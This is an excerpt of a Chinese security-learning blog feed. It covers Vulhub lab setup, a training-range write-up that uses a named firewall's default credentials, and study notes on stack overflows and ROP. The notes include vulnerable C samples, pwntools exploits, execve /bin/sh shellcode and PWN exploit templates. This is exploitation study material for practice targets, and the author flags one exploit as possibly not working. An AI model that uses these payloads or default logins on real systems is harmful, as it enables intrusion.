&lt;li&gt;web服务器</summary>
      
    
    
    
    
    <category term="php" scheme="https://sinky.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Kali安装vulhub</title>
    <link href="https://sinky.top/2022/11/21/Kali%E5%AE%89%E8%A3%85vulhub/"/>
    <id>https://sinky.top/2022/11/21/Kali%E5%AE%89%E8%A3%85vulhub/</id>
    <published>2022-11-21T01:23:59.283Z</published>
    <updated>2022-11-24T01:55:50.473Z</updated>
    
    <content type="html"><![CDATA[<p>再搭一个靶场，基于docker和docker-compose的漏洞环境集合。</p><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>切root用户：</p><pre><code class="hljs">apt-get update #更新apt-get install -y apt-transport-https ca-certificates #安装https协议、CA证书apt install docker.io # 安装dockerdocker -v # 查看是否安装成功systemctl start docker # 启动dockerdocker ps -a # 查看docker信息</code></pre><h1 id="安装pip和docker-compose"><a href="#安装pip和docker-compose" class="headerlink" title="安装pip和docker-compose"></a>安装pip和docker-compose</h1><pre><code class="hljs">apt-get install python3-pip # 安装pippip3 install docker-compose # 安装docker-composedocker-compose -v # 查看版本信息</code></pre><h1 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h1><pre><code class="hljs">git clone https://github.com/vulhub/vulhub.git # 下载vulhubcd vulhub lscd rails/CVE-2019-5418 # 随便进入一个靶场docker-compose up -d # 开启靶场环境</code></pre><p>哦豁，失败，我就说我怎么可能搭建环境这么顺利。<br>切换了root，就可以了，等了好一会儿开启</p><p><img src="https://s2.loli.net/2022/11/22/3uqSHPgRDlUCNpY.png" alt="image.png"></p><p>查看靶场启动环境 <code>docker-compose ps -a</code><br>查看该环境运行的端口</p><p>然后连接一下网址：<code>http://kali的ip:端口/</code></p><p><img src="https://s2.loli.net/2022/11/22/D8ap4yEcRSrixnO.png" alt="image.png"></p><p>关闭环境：<code>docker-compose down</code></p><p><img src="https://s2.loli.net/2022/11/22/jInPGpJxXWTs2cA.png" alt="image.png"></p><pre><code class="hljs">重启docker：systemctl restart docker关闭docker：systemctl stop dockersystemctl stop docker.socket查看docker运行时状态：systemctl status docker</code></pre><p>（这次搭建靶场顺利到不可思议！！！）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;再搭一个靶场，基于docker和docker-compose的漏洞环境集合。&lt;/p&gt;
&lt;h1 id=&quot;安装docker&quot;&gt;&lt;a href=&quot;#安装docker&quot; class=&quot;headerlink&quot; title=&quot;安装docker&quot;&gt;&lt;/a&gt;安装docker&lt;/h1&gt;&lt;p&gt;</summary>
      
    
    
    
    
    <category term="docker" scheme="https://sinky.top/tags/docker/"/>
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="环境搭建" scheme="https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>靶场：某防火墙默认口令</title>
    <link href="https://sinky.top/2022/11/15/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/"/>
    <id>https://sinky.top/2022/11/15/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</id>
    <published>2022-11-15T05:53:43.820Z</published>
    <updated>2022-11-22T08:51:27.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>安全工程师”墨者”对某公司进行授权测试时，扫描公网IP时发现当前公司在网络边界部署了某型号防火墙，并且公网可以访问防火墙的WEB页面。</p><p>实训目标</p><ol><li>掌握查看当前设备类型的方法；</li><li>了解网络（安全）设备的登录控制方式；</li><li>了解网络（安全）设备的默认口令获取方式；</li><li>了解当前型号防火墙的不同账户的区别；</li><li>了解在网络信息安全中的权限最小化、权限分离作用；</li></ol><p>解题方向</p><p>找到防火墙的默认口令进行登录。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>题目给了一个登录界面，我注意到题目标题：天清汉马，那就百度搜了一下天清汉马防火墙的默认账号密码</p><p>账号：useradmin</p><p>密码：venus.user</p><p>然后……就拿到key了！</p><pre><code class="hljs">KEY: mozhedf5bfbb87e52d81d6c658bda251</code></pre><p>说实话这不值得我花三个币！！！</p><h1 id="拓展-防火墙"><a href="#拓展-防火墙" class="headerlink" title="拓展 防火墙"></a>拓展 防火墙</h1><p>防火墙是指设置在不同网络或网络安全域之间的一系列部件的组合，它可以通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现网络的安全保护，在逻辑上，防火墙是一个分离器，一个限制器，也是一个分析器，有效的监控了内部网和Internet之间的任何活动，保证了内部网络的安全。</p><p>防火墙，一个硬件设备或软件系统，主要架设在内部网络和外部网络间，为了防止外界恶意程序对内部系统的破坏，或者组织内部重要信息向外流出，有双向监督的功能。</p><h2 id="防火墙的分类及原理"><a href="#防火墙的分类及原理" class="headerlink" title="防火墙的分类及原理"></a>防火墙的分类及原理</h2><h3 id="包过滤技术"><a href="#包过滤技术" class="headerlink" title="包过滤技术"></a>包过滤技术</h3><p>包过滤技术是一种简单、有效的安全控制技术，它工作在网络层，通过在为网络间相互连接的设备上加载允许、禁止来自某些特定的源地址、目的地址、TCP端口号等规则，对通过设备的数据包进行检查，限制数据包进出内部网络</p><p>包过滤技术的优点是对用户透明，传输性能高，但由于安全控制层次在网络层、传输层，安全控制力度也只限于源地址、目的地址和端口号，因而只能进行较为初步的安全控制。</p><h3 id="应用代理技术"><a href="#应用代理技术" class="headerlink" title="应用代理技术"></a>应用代理技术</h3><p>应用代理防火墙工作在OSI的第七层，它通过检查所有应用层的信息包，并将检查的内容信息放入决策过程，从而提高网络的安全性。</p><p>应用网关防火墙是通过打破客户机/服务器模式实现的。每个客户机/服务器通信需要两个二连接：从客户端到防火墙，从防火墙到服务器。</p><p>另外，每个代理需要一个不同的应用进程，或一个后台运行的服务程序，对每个新的应用必须添加针对此应用的服务程序，否则不能使用该服务</p><p>所以，应用网关防火墙具有可伸缩性差的缺点。</p><h3 id="状态检测技术"><a href="#状态检测技术" class="headerlink" title="状态检测技术"></a>状态检测技术</h3><p>状态检测防火墙工作在OSI的第二至四层，采用状态检测包过滤的技术，是传统包过滤功能扩展而来。状态检测防火墙在网络层有一个检查引擎截获数据包并抽取出与应用层状态有关的信息，并以此为依据决定对该连接是接受还是拒绝，这种技术提供了高度安全的解决方案，同事具有较好的适应性和扩展性。</p><p>状态检测防火墙基本保持了简单包过滤防火墙的优点，性能较好，同时在防火墙的核心部分建立状态连接表，维护了连接，将进出昂罗的数据当成一个个的时间来处理，主要特点是由于缺乏对应用层协议的深度检测功能，无法彻底识别数据包中大量的垃圾邮件、广告以及木马程序等。</p><h3 id="完全内容检测技术"><a href="#完全内容检测技术" class="headerlink" title="完全内容检测技术"></a>完全内容检测技术</h3><p>完全内容检测技术防火墙综合状态检测与应用代理技术，并基于多层检测架构，把防病毒、内容过滤，应用识别等功能整合到防火墙中，还包括IPS功能，在网络边界实施OSI第七层的内容扫描，实现了实时在网络边缘部署病毒防护、内容过滤等应用层服务措施。</p><p>完全内容检测技术防火墙可以检测整个数据包内容，根据需要建立连接状态表，网络层保护强，应用层控制细等有点，但由于功能集成度高，对产品硬件要求较高</p><h2 id="防火墙作用"><a href="#防火墙作用" class="headerlink" title="防火墙作用"></a>防火墙作用</h2><ul><li>保护脆弱的服务：过滤不安全服务，提高网络安全减少主机风险</li><li>控制对系统的访问</li><li>集中的安全管理：在防火墙定义的安全规则可以运行于整个内部网络系统，而无需在内部网每台机器上分别设立安全策略</li><li>增强的保密性：可以阻止攻击者获取攻击网络系统的有用信息</li><li>记录和统计网络利用数据以及非法使用数据</li><li>策略执行：提供了指定和执行网络安全策略的手段。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h1&gt;&lt;p&gt;安全工程师”墨者”对某公司进行授权测试时，扫描公网IP时发现当前公司在网络边界部署了某型号防火墙，并且公网可以访问防火墙的W</summary>
      
    
    
    
    
    <category term="墨者学院，靶场，防火墙" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%8C%E9%9D%B6%E5%9C%BA%EF%BC%8C%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出原理及利用学习</title>
    <link href="https://sinky.top/2022/11/10/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sinky.top/2022/11/10/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-11-10T06:02:14.144Z</published>
    <updated>2022-12-07T05:40:34.922Z</updated>
    
    <content type="html"><![CDATA[<p>参考文章：</p><p><a href="https://zhuanlan.zhihu.com/p/113504765?utm_source=qq">https://zhuanlan.zhihu.com/p/113504765?utm_source=qq</a></p><p><a href="https://www.secpulse.com/archives/192491.html">https://www.secpulse.com/archives/192491.html</a></p><h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>数据结构，先进后出，先进的数据压入栈底，最后的数据在栈顶</p><ul><li>Push 将数据压入栈顶</li><li>Pop 将栈顶数据弹出</li></ul><p>栈帧：每个未完成运行的函数占用一个独立的连续区域，称作栈帧</p><p><img src="https://s2.loli.net/2022/11/11/RHinVQcJfPOgxSk.png" alt="image.png"></p><ul><li>代码段：存放可执行程序的代码，可读不可写</li><li>数据段：存放程序中已经初始化的静态（全局）变量，可读写</li><li>bss段：存放程序中未初始化的静态（全局）变量，可读写</li><li>堆(heap)：存放动态分配的内容，需要程序员手动分配和释放</li><li>栈(stack)：存放局部变量，如函数的参数、返回地址、局部变量等，有系统自动分配和释放</li></ul><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>栈增长方向：高-&gt;低</p><p>ESP: 栈指针，指向栈顶低地址</p><p>ESP: 基址指针，指向栈底高地址</p><p>EIP: 指令指针，存储即将执行的程序指令地址</p><h3 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h3><p>函数调用约定是指当一个函数被调用时，函数的参数会被传递给被调用的函数和返回值会被返回给调用函数，函数的调用约定规定了执行过程中函数的调用者和被调用者之间如何传递参数以及如何恢复栈平衡。</p><p>常用的函数调用约定：</p><pre><code class="hljs">__cdecl # C/C++默认方式，参数从右到左压栈，主调函数负责栈平衡__stdcall # windows API默认方式，参数从右向左入栈，被调函数负责栈平衡__fastcall # 快速调用方式，将参数有限从寄存器(ECX和EDX)传入，其余参数再从右向左从栈传入thiscall # 从右向左入栈，若参数数目固定，则类实例的this指针通过ecx传递给被调函数，被调函数自身清理堆栈，若参数数目补丁，则this指针在所有参数入栈后再入栈，主调函数清理堆栈pascal # 从左向右入栈，支支持固定参数的函数，类型和数量完全可知，被调函数自身清理堆栈，输出的函数名称五任何修饰且全部大写naked call # 编译器不产生保存和恢复寄存器的代码，且不能用return返回返回值，该调用约定用于特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令</code></pre><h3 id="函数调用开始"><a href="#函数调用开始" class="headerlink" title="函数调用开始"></a>函数调用开始</h3><p>在调用一个函数时，系统会为函数分配一个栈帧，栈帧空间为该函数独有</p><p>调用者调用函数过程：</p><ul><li>函数参数从右到左入栈</li><li>返回地址入栈</li><li>上一函数ebp入栈</li><li>balabala</li></ul><p>在上一函数ebp入栈后，就开辟了被调函数的新栈帧，然后被调函数临时变量入栈。</p><pre><code class="hljs">//调用前push arg3 //32位esp-4,64位esp-8push arg2push arg1call func // 压入当前指令地址，即保存返回地址，后jmp到调用函数的入口地址push ebp // 保存旧栈帧底部，在func执行完后再pop ebpmov ebp,ebp // 设置新栈帧的底部sub esp,xxx  // 设置新栈帧的顶部</code></pre><p>（之前在一本书里学过，但是记得不那么清楚了）</p><h3 id="函数调用结束"><a href="#函数调用结束" class="headerlink" title="函数调用结束"></a>函数调用结束</h3><p>函数调用结束，按照相反顺序将数据弹出栈：</p><ul><li>弹出临时变量</li><li>弹出调用函数的ebp值，存入ebp寄存器中</li><li>弹出返回地址，存在eip寄存器中</li></ul><p>返回地址即是用call指令调用函数时下一条指令的地址，存到eip中</p><h1 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h1><p>栈溢出是指向栈中写入超出限定长度的数据，一处的数据覆盖栈中其他数据，从而影响程序运行，当攻击者计算好溢出长度，编写一处数据，用我们想要的地址数据覆盖函数返回地址，那么被调函数调用完返回主函数时，就会跳转到我们覆盖的地址，通过改变程序流程，达到利用的目的。</p><p>目的：</p><ul><li>破坏程序内存结构</li><li>执行system(‘/bin/sh’)</li><li>执行shellcode</li></ul><h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><pre><code class="hljs">输入：gets scanf vxcanf输出：sprintf字符串：strcpy strcat bcopy</code></pre><h1 id="简单栈溢出总结"><a href="#简单栈溢出总结" class="headerlink" title="简单栈溢出总结"></a>简单栈溢出总结</h1><ol><li>寻找危险函数：<ol><li>输入</li><li>输出</li><li>字符串</li><li>gets()，直接读取一行，忽略’x00’</li><li>scanf</li><li>vscanf</li><li>sprintf</li><li>strncpy,字符串拼接，遇到’x00’停止</li><li>strcat,字符串拼接，遇到’x00’停止</li><li>bcopy</li><li>寻找危险函数，快速确定程序是否有栈溢出，有则寻找位置</li><li>常见危险函数</li></ol></li><li>确定填充长度<ol><li>覆盖函数返回地址，直接查看ebp即可</li><li>覆盖栈上某个变量的内容，需计算</li><li>覆盖bss段某个变量的内容</li><li>根据实际情况覆盖特定变量或地址的内容</li><li>相对于栈基地址的索引，可以直接通过查看ebp相对偏移量获得</li><li>相对应栈顶指针的索引，需要进行调试</li><li>直接地址索引，相当于直接给定了地址</li></ol></li></ol><p>栈可以看成一个漏斗，栈底地址大，栈顶地址小，在一个存储单元中，按照由小到大进行存储，它的目的是赋予程序一个额方便的途径来访问特定函数的局部数据，并从函数调用者那边传递信息。</p><p>栈溢出属于缓冲区溢出，指程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p><h1 id="调试举例"><a href="#调试举例" class="headerlink" title="调试举例"></a>调试举例</h1><h2 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h2><pre><code class="hljs">gets() # 不检查输入的字符串长度，用回车判断是否结束，很容易导致栈溢出</code></pre><p>栗子：</p><p>参考文章：<a href="https://www.jianshu.com/p/a2e602da8f7c" title="栈溢出原理">https://www.jianshu.com/p/a2e602da8f7c</a></p><p>代码：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">success</span><span class="hljs-params">()</span></span>{<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"The flag is flag{Tri0mphe!!!}"</span>);<br>}<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">vulnerable</span><span class="hljs-params">()</span> </span>{<br>        <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>];<br>        <span class="hljs-built_in">gets</span>(s);<br>        <span class="hljs-built_in">puts</span>(s);<br>        <span class="hljs-keyword">return</span>;<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">int</span> **argv)</span></span>{<br>        <span class="hljs-built_in">vulnerable</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>文件命名为a.c</p><p>扔进linux中编译<code>gcc -m32 -fno-stack-protector -no-pie a.c -o a </code></p><p><code>-m32</code> 生成32位程序<br><code>-fno-stack-protector</code> 不开启堆栈溢出保护，即不生成canary</p><p><code>-no-pie</code> 避免加载基址被打乱</p><p>checksec一下：</p><pre><code class="hljs">Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><p>IDA分析：</p><pre><code class="hljs">int vulnerable(){    char s[16]; // [esp+4h] [ebp-14h] BYREF    gets(s);    return puts(s);}</code></pre><p>字符串s距离ebp长度为0x14，所以栈结构s为：</p><p><img src="https://s2.loli.net/2022/12/05/mZN8aUwqYc1sEv2.png" alt="image.png"></p><p>success()的地址为0x08048456</p><p>构造payload:</p><pre><code class="hljs">0x14*'a'+'bbbb'+success_addr</code></pre><p>此时栈结构为：</p><p><img src="https://s2.loli.net/2022/12/05/MgIlq5V1mkWZ2H8.png" alt="image.png"></p><p>exp:</p><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean"> # coding-utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> # 构造交互对象<br>p=process(<span class="hljs-string">'./a'</span>) <br> # flag函数地址<br>success_addr=<span class="hljs-number">0x08048456</span><br> # 构造payload<br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">'bbbb'</span>+p32(success_addr)<br> # 向程序发送字符串<br>p.sendline(payload)<br> # 将代码交互改为手动交互<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><p>成功！</p><p><img src="https://s2.loli.net/2022/12/05/s6xOwv8ShRoUt7k.png" alt="image.png"></p><h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>开NX保护，可以用ROP绕过，主要思路是在缓冲区溢出基础上，利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p><p>gadgets是以ret结尾的指令序列，通过这个指令序列可以修改某些地址的内容，方便控制程序的执行流程</p><p>利用指令集中ret指令，改变指令流的执行顺序。</p><p>ROP攻击前提条件：</p><ul><li>程序存在溢出，并且可以控制返回地址</li><li>可以找到满足条件的gadgest以及相应gadgets的地址</li></ul><h2 id="ret2text（可能没成功？）"><a href="#ret2text（可能没成功？）" class="headerlink" title="ret2text（可能没成功？）"></a>ret2text（可能没成功？）</h2><p>控制返回地址指向程序本身已有的的代码(.text)并执行。</p><p>代码：两个子函数func()和sys，gets位置存在栈溢出，sys函数未被调用。</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs scss"> <span class="hljs-selector-id">#include</span> &lt;stdlib<span class="hljs-selector-class">.h</span>&gt;<br>int <span class="hljs-built_in">sys</span>(){<br><span class="hljs-built_in">system</span>("/bin/sh");<br>}<br>int <span class="hljs-built_in">func</span>(){<br>char <span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[10]</span>;<br><span class="hljs-built_in">gets</span>(a);<br><span class="hljs-built_in">puts</span>(a);<br>}<br>int <span class="hljs-selector-tag">main</span>(){<br><span class="hljs-built_in">func</span>();<br>}<br></code></pre></td></tr></tbody></table></figure><p>编译：<code>gcc -g -fno-stack-protector -no-pie -o ret2text64 ret2text.c</code></p><p>关闭canary和pie</p><p>先checksec查看安全机制：</p><p><img src="https://s2.loli.net/2022/12/06/U6nrtQwefZ5B9K4.png" alt="image.png"></p><p>got表可写，开启NX保护，用rop</p><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>我们需要覆盖通过func函数中局部变量a的溢出，覆盖func函数的返回地址，将其引导到sys函数地址就可以获取shell。</p><p>需要：</p><ol><li>局部变量a的地址</li><li>func函数的返回地址</li><li>sys函数的地址</li></ol><h3 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h3><p>进入gdb-peda,在func()下断点调试：</p><pre><code class="hljs">l # 查看源代码b 5 # 在第五行下断点r # 运行程序</code></pre><p><img src="https://s2.loli.net/2022/12/06/LxCsYFB1tkHrOJj.png" alt="image.png"></p><pre><code class="hljs">p &amp;a # 打印当前局部变量a的地址p $rbp # 打印rbp地址</code></pre><p><img src="https://s2.loli.net/2022/12/06/4SFHQpMkERqGs7d.png" alt="image.png"></p><p>变量a地址为0xffe376</p><p>rbp=0xffe380</p><p>IDA找到sys函数地址为：0x400577</p><p><img src="https://s2.loli.net/2022/12/06/aLtQBMF5CeI2iwo.png" alt="image.png"></p><p>func函数返回地址，在64位程序中，在rbp之后8字节，所以func_addr=rbp+8=0xffe388</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>分析payload构成，填充局部变量a直到返回地址，然后再将后面8个字节的位置填充为sys函数的地址。</p><p>偏移长度=返回地址-局部变量地址=0x12=18</p><pre><code class="hljs">payload='A'*18+p64(0x400577)</code></pre><p>exp:</p><pre><code class="hljs">from pwn import *p=process("./ret2text64")payload='A'*18+p64(0x400577)p.sendline(payload)p.interactive</code></pre><p>但执行了exp之后，并没有给我什么显示，所以我不确定。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/113504765?utm_source=qq&quot;&gt;https://zhuanlan.zhihu.com/p/113504765?utm_source=qq&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="学习笔记" scheme="https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="漏洞" scheme="https://sinky.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>PWN的exp编写学习记录</title>
    <link href="https://sinky.top/2022/11/10/PWN%E7%9A%84exp%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://sinky.top/2022/11/10/PWN%E7%9A%84exp%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2022-11-10T05:32:42.447Z</published>
    <updated>2022-11-29T08:58:23.168Z</updated>
    
    <content type="html"><![CDATA[<p>整理以下exp的编写，根据网上文章结合个人去整理的。</p><h1 id="exp的基本框架"><a href="#exp的基本框架" class="headerlink" title="exp的基本框架"></a>exp的基本框架</h1><pre><code class="hljs">from pwn import*DEBUG # 自己设定值，在本地调试还是远程利用，不写也行if DEBUG:    p=process(bin路径) # 在本地调试else:    p=remote(ip,port) # 连接其他主机的服务，需要输入对应ip和端口号payload=…… # 输入payload进行操作以拿到程序的shellp.interactive() # 反弹shell</code></pre><h1 id="io交互"><a href="#io交互" class="headerlink" title="io交互"></a>io交互</h1><pre><code class="hljs">recv() # 接受收到的所有字符recvuntil() # 接收到第一次出现str的内容为止recvline() # 接收一行send(str) # 发送str的内容sendline(str) # 发送str的内容并加个回车发送注: 当不确定io内容时，可以在exp开头加 context.log_level="debug"帮助调试。</code></pre><h1 id="打包解包数据"><a href="#打包解包数据" class="headerlink" title="打包解包数据"></a>打包解包数据</h1><pre><code class="hljs">打包：p64() p32()解包：u64() u32()</code></pre><h1 id="bin文件操作"><a href="#bin文件操作" class="headerlink" title="bin文件操作"></a>bin文件操作</h1><pre><code class="hljs">elf=ELF("binfilepath")libc=ELF("libcpath")bss_base_addr=elf.bss() # 得到程序bss段的起始位置PLT: write_plt=elf.plt["write"]GOT: write_got=elf.got["write"]注： 在系统ASLR关闭的情况下才会找到，否则只能得到一个偏移量</code></pre><h1 id="exp编写练习记录"><a href="#exp编写练习记录" class="headerlink" title="exp编写练习记录"></a>exp编写练习记录</h1><p>以下都是我搜集的pwn题的exp，感觉做题然后学着写exp太慢了，所以先直接抄作业。</p><h2 id="PWN题常用模板"><a href="#PWN题常用模板" class="headerlink" title="PWN题常用模板"></a>PWN题常用模板</h2><h3 id="单个发送（pwn库）"><a href="#单个发送（pwn库）" class="headerlink" title="单个发送（pwn库）"></a>单个发送（pwn库）</h3><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean"> #coding=utf<span class="hljs-number">-8</span> #中文乱码<br><span class="hljs-keyword">from</span> zio <span class="hljs-keyword">import</span> *<br>Thread=zio((<span class="hljs-string">'./pwn'</span>)) # 执行同目录下的pwn<br>Thread=write(<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>+<span class="hljs-string">'\x00\x00\x00\x01'</span>) # 输入payload<br>Thread=interact()<br><span class="hljs-comment">//p32(Address)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="ZIO库"><a href="#ZIO库" class="headerlink" title="ZIO库"></a>ZIO库</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> zio import *<br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">Thread</span>=zio(('./pwn'))<br> #<span class="hljs-attribute">shellcode1</span>=<span class="hljs-string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span><br><span class="hljs-attribute">shellcode</span>=<span class="hljs-string">'\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50'</span><br><span class="hljs-attribute">TargetAddress</span>=0x000000000040066E<br><span class="hljs-attribute">Length</span>=len(shellcode)<br><span class="hljs-attribute">payload</span>=shellcode+'\x90'*(72-Length)+p64(TargetAddress)<br>Thread.write(payload)<br>Thread.interact()<br></code></pre></td></tr></tbody></table></figure><h3 id="pwn库：有消息接收和判断的"><a href="#pwn库：有消息接收和判断的" class="headerlink" title="pwn库：有消息接收和判断的"></a>pwn库：有消息接收和判断的</h3><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>Shellcode=<span class="hljs-string">'a'</span>*<span class="hljs-number">112</span>+<span class="hljs-string">'\x5D\x86\x04\x08'</span><br>Target=process(<span class="hljs-string">'./pwn'</span>)<br>Target.sendline(Shellcode)<br>Target.recvuntil(<span class="hljs-string">':$'</span>)<br> #context.terminal=[<span class="hljs-string">'gnome-terminal'</span>,<span class="hljs-string">'-x'</span>,<span class="hljs-string">'sh'</span>,<span class="hljs-string">'-c'</span>]<br> #gdb.attach(proc.pidof(Target)[<span class="hljs-number">0</span>])<br>Target.sendline(<span class="hljs-string">'zhimakaimen'</span>)<br>Target.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="整数溢出型"><a href="#整数溢出型" class="headerlink" title="整数溢出型"></a>整数溢出型</h3><p>exp不理解，先不写。</p><p><a 